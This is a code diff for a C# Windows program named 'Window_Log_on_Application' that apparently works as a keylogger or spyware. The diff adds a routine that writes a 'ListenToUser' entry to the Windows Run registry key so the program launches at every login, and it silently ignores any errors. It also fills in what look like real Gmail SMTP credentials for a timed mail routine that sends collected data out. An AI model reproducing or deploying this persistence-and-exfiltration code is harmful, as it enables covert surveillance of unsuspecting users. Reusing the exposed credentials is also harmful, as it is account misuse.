@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -240,6 +241,24 @@ namespace Window_Log_on_Application
         }
         #endregion
 
+        #region Registry that open with window
+        static void StartWithOS()
+        {
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyvalue = "1";
+            try
+            {
+                regkey.SetValue("Index", keyvalue);
+                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regkey.Close();
+            }
+            catch (System.Exception ex)
+            {
+            }
+        }
+        #endregion
+
         #region Mail
         static int mailTime = 5000;
         static void SendMail()
@@ -275,7 +294,7 @@ namespace Window_Log_on_Application
                 }
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("gokudeptrai7@gmail.com", "nguyenvanhoanganh");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
